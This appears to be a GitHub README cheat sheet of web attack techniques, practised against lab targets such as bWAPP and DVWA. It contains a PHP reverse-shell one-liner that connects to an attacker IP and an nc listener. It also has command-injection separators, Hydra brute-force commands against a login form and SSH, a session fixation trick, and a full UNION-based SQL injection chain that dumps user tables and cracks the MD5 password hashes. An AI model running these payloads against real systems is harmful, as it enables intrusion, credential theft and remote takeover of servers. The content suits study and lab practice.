<div align="center" id="top"> 
  &#xa0;
</div>

<h1 align="center">Injection</h1>
<br>

## HTML Injection ##

- Refresh
```html
<meta http-equiv="refresh" content="5" URL=http://www.google.com />
```
<br>

## Command injection ##

- victim
  ```bash
  php -r '$sock=fsockopen("{{MY_IP}}",{{MY_PORT}});exec("/bin/bash -i <&3 >& 3 2>& 3");'
  ```
  => open connection from victim server and run 'bash' connect to hacker ip

- hacker
  ```bash
  nc -lvp {{MY_PORT}}
  ```
   => waiting for the connection from victim server

> **Saperated command for command injection on web**

<br>

There are the same result
> ping 192.168.1.1 -c 3; ls <br>
> => ping 192.168.1.1 -c 3 && ls <br>
> => ping 192.168.1.1 -c 3 & ls <br>

<br>

## Broken Authentication ##

### Broken Authentication ###
- Register the same name, `e.g.` the real user is 'ham' but you don't know password, you will register with name ' ham'(`space before name`) and create you password, and then login with 'ham' and you password

### Forgot password ###
- guess the usernames from 'worldliest/http_default-users.txt' => analysis by response size
- if found the username, guess question for retrieve password => analysis by response size

### Session Fixation ###
- Send mail or link to victim and set 'SID' into parameter `e.g.` www.test.com?a=5&b=1&SID=`123456`, 
If the victim login success, you must use `'SID'` as the same as the victim(in this case is `123456`)

**User attack type: Sniper => use static words to test**


<br>

## Bruteforce Attacks ##

- Cluster Bomb => Guess the username(`worldliest/http_default-users.txt) and password(worldliest/http_default-pass.txt`) and run the script to test.(Combination between username and password)

**You can use `'Grep - Match'` to reduce or specify the response**

**User attack type: Cluster Bomb**

<br>

- Hydra Bwapp => programm or script to help to crack username and password

link => http://192.168.43.35/bWAPP/login.php

````
HTML
input => name="login"
input => name="password"
button => name="form", value="submit"
*Message when login failed => "Invalid credentials or user not activated!"

Files
users.txt => lists of users
passwords.txt => Lists of password

Variables
- ^USER^
- ^PASS^

** Remove '!' for run this command on terminal

*This is command for use hydra to attack
hydra 192.168.43.35 http-form-post "/bWAPP/login.php:login=^USER^&password=^PASS^&form=submit:Invalid credentials or user not activated" -L users.txt -P passwords.txt
````

<br>

## Hydra SSH ##

```bash
# Scan ssh port
nmap 192.168.43.35 -F

hydra 192.168.43.35 -t 4 ssh -L users.txt -P passwords.txt
```
** -t to reduce parallel task **

<br>

## SQL injection ##

  - Find query to bypass sql query, `e.g.` 
  ```sql
  SELECT * FROM xxx WHERE username='test' or '1'='1 and ..... --
  ```
  (can add query to get user by id =>  .... username='test' or id='2), **Don't forgot '--' to convert the rest sql query to comment**

<br>

### Vulnerability: SQL Injection ###

```sql
# Original SQL => input is \'
select * from xxx where id='\''

# **Assume id is 2
2' order by 1 -- '

# ** get database and user for reduce output to the same columns(1, 2) of main table
2' UNION select database(), user() -- '

# **Get database schema to double-check 'dvwa' database
# **Assume we can get database name: dvwa, and user: dvwa@localhost
# ** ', 2' to output the same columns of main table
2' union select schema_name, 2 from information_schema.schemata -- '


# **Get database schema of database:dvwa
# **Assume schema_name:dvwa
2' union select table_name, 2 from information_schema.tables where table_schema='dvwa' -- '

# **Assume we can get list of tables on database: dvwa
# **Focus on table 'users'
2' union select column_name, 2 from information_schema.columns where table_schema='dvwa' -- '


# **Assume we can get all columns of table:users on databasse:dvwa
# **Display information them
2' union select concat(user_id,':',user,':',password), concat(first_name,':',last_name) from dvwa.users -- '


# **Assume we can get a lot of informations
# **e.g. '1:admin:21232f297a57a5a743894a0e4a801fc3, admin:admin', '3:1337:8d3533d75ae2c3966d7e0d4fcc69216b, Hack:Me'
# **Find reverse md5
# 8d3533d75ae2c3966d7e0d4fcc69216b => charley
# 21232f297a57a5a743894a0e4a801fc3 => admin
```

---
<br>

## License ##

This project is under license from me.

Contributor: <a href="https://github.com/wutchara" target="_blank">Wutchara</a>

&#xa0;

<a href="#top">Back to top</a>